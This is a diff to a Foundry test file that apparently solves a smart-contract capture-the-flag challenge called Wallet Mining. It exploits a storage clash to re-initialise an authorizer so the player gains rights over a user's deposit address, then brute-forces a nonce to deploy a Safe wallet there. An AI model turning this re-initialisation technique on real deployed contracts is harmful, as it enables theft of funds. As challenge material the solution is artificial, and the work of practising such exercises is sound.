@@ -11,6 +11,7 @@ import {WalletDeployer} from "../../src/wallet-mining/WalletDeployer.sol";
 import {
     AuthorizerFactory, AuthorizerUpgradeable, TransparentProxy
 } from "../../src/wallet-mining/AuthorizerFactory.sol";
+import {SafeProxy} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxy.sol";
 
 contract WalletMiningChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -123,7 +124,40 @@ contract WalletMiningChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_walletMining() public checkSolvedByPlayer {
-        
+        // needsInit != 0 due storage clash, re-init the authorizer to setup the player as ward
+        address[] memory wards = new address[](1);
+        wards[0] = player;
+        address[] memory aims = new address[](1);
+        aims[0] = USER_DEPOSIT_ADDRESS;
+        authorizer.init(wards, aims);
+
+        //  build safe 1-1 initializer
+        address[] memory owners = new address[](1);
+        owners[0] = user;
+        bytes memory initializer = abi.encodeCall(
+            Safe.setup, 
+            (
+                owners,
+                1,
+                address(0),
+                "",
+                address(0),
+                address(0),
+                0,
+                payable(address(0))
+            )
+        );
+
+        // Bruteforce the nonce
+        uint256 nonce = 0;
+        while (!walletDeployer.drop(USER_DEPOSIT_ADDRESS, initializer, nonce)) {
+            if (nonce > 1000) {
+                break;
+            }
+            nonce++;
+        }
+        console.log(nonce);
+
     }
 
     /**
